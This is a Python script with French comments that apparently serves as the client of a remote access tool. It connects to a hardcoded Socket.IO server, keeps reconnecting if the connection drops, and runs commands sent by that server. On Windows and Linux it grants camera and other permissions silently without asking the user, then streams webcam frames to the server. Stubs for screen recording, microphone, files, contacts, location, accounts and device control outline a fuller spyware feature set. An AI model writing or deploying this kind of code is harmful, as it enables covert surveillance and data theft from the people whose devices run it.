import socketio
import platform
import cv2
import time
import os

# Créer une instance de client Socket.IO
sio = socketio.Client()

permissions_granted = {}

# Fonction pour détecter l'environnement
def detect_environment():
    system = platform.system()
    if system == "Windows":
        return "pc"
    elif system == "Linux":
        return "pc"
    elif system == "Darwin":
        return "mac"
    else:
        return "mobile"

# Fonction pour simuler la demande de permissions
def request_permissions(action, environment):
    if action in permissions_granted:
        return permissions_granted[action]
    
    if environment == "pc":
        permissions_granted[action] = True
        return True

    if environment == "mac" or environment == "mobile":
        user_input = input(f"Voulez-vous accorder l'accès à {action} ? (oui/non): ")
        granted = user_input.lower() == "oui"
        permissions_granted[action] = granted
        return granted

# Fonction pour ouvrir la caméra et envoyer des images
def start_camera(environment):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return

    while True:
        ret, frame = cap.read()
        if not ret:
            break
        ret, jpeg = cv2.imencode('.jpg', frame)
        if ret:
            sio.emit('videoStream', jpeg.tobytes())
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    cv2.destroyAllWindows()

# Fonction pour démarrer l'enregistrement d'écran
def start_screen(environment):
    pass  # Remplacer par un véritable enregistrement d'écran

# Fonction pour ajuster la luminosité
def adjust_brightness(value, environment):
    pass  # Remplacer par logique réelle

# Fonction pour gérer le microphone
def start_microphone(environment):
    pass  # Remplacer par logique réelle

# Fonction pour gérer les fichiers
def access_files(environment):
    pass  # Remplacer par logique réelle

# Fonction pour envoyer des messages
def send_messages(environment):
    pass  # Remplacer par logique réelle

# Fonction pour accéder aux contacts
def access_contacts(environment):
    pass  # Remplacer par logique réelle

# Fonction pour suivre la localisation
def track_location(environment):
    pass  # Remplacer par logique réelle

# Fonction pour gérer les notifications
def manage_notifications(environment):
    pass  # Remplacer par logique réelle

# Fonction pour gérer les comptes
def manage_accounts(environment):
    pass  # Remplacer par logique réelle

# Fonction pour contrôler l'appareil à distance
def control_device(environment):
    pass  # Remplacer par logique réelle

# Quand le client est connecté au serveur
@sio.event
def connect():
    pass

# Quand le client reçoit une commande du serveur
@sio.event
def command(data):
    environment = detect_environment()

    if data.get('action') == 'startCamera':
        if request_permissions("caméra", environment):
            sio.emit('response', {'action': 'cameraStarted', 'status': 'success'})
            start_camera(environment)  # Démarre la caméra
        else:
            sio.emit('response', {'action': 'cameraStarted', 'status': 'permissionDenied'})

    elif data.get('action') == 'startScreen':
        if request_permissions("enregistrement d'écran", environment):
            sio.emit('response', {'action': 'screenStarted', 'status': 'success'})
            start_screen(environment)  # Démarre l'enregistrement d'écran
        else:
            sio.emit('response', {'action': 'screenStarted', 'status': 'permissionDenied'})

    elif data.get('action') == 'adjustBrightness':
        if request_permissions("luminosité", environment):
            adjust_brightness(data.get('value'), environment)  # Ajuste la luminosité
        else:
            sio.emit('response', {'action': 'brightnessAdjustment', 'status': 'permissionDenied'})

    elif data.get('action') == 'startMicrophone':
        if request_permissions("microphone", environment):
            start_microphone(environment)  # Active le microphone
        else:
            sio.emit('response', {'action': 'microphoneStarted', 'status': 'permissionDenied'})

    elif data.get('action') == 'accessFiles':
        if request_permissions("fichiers", environment):
            access_files(environment)  # Accède aux fichiers
        else:
            sio.emit('response', {'action': 'filesAccessed', 'status': 'permissionDenied'})

    elif data.get('action') == 'sendMessages':
        if request_permissions("messages", environment):
            send_messages(environment)  # Envoie des messages
        else:
            sio.emit('response', {'action': 'messagesSent', 'status': 'permissionDenied'})

    elif data.get('action') == 'accessContacts':
        if request_permissions("contacts", environment):
            access_contacts(environment)  # Accède aux contacts
        else:
            sio.emit('response', {'action': 'contactsAccessed', 'status': 'permissionDenied'})

    elif data.get('action') == 'trackLocation':
        if request_permissions("localisation", environment):
            track_location(environment)  # Suivi de la localisation
        else:
            sio.emit('response', {'action': 'locationTracked', 'status': 'permissionDenied'})

    elif data.get('action') == 'manageNotifications':
        if request_permissions("notifications", environment):
            manage_notifications(environment)  # Gère les notifications
        else:
            sio.emit('response', {'action': 'notificationsManaged', 'status': 'permissionDenied'})

    elif data.get('action') == 'manageAccounts':
        if request_permissions("comptes", environment):
            manage_accounts(environment)  # Gère les comptes
        else:
            sio.emit('response', {'action': 'accountsManaged', 'status': 'permissionDenied'})

    elif data.get('action') == 'controlDevice':
        if request_permissions("contrôle de l'appareil", environment):
            control_device(environment)  # Contrôle l'appareil
        else:
            sio.emit('response', {'action': 'deviceControlled', 'status': 'permissionDenied'})

# Quand le client est déconnecté du serveur
@sio.event
def disconnect():
    while not sio.connected:
        time.sleep(1)
        sio.connect('http://10.136.11.104:3000')

# Connexion au serveur
server_url = 'http://10.136.11.104:3000'  # Remplacer par l'IP de ton serveur
sio.connect(server_url)

# Empêche le script de se fermer
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    sio.disconnect()
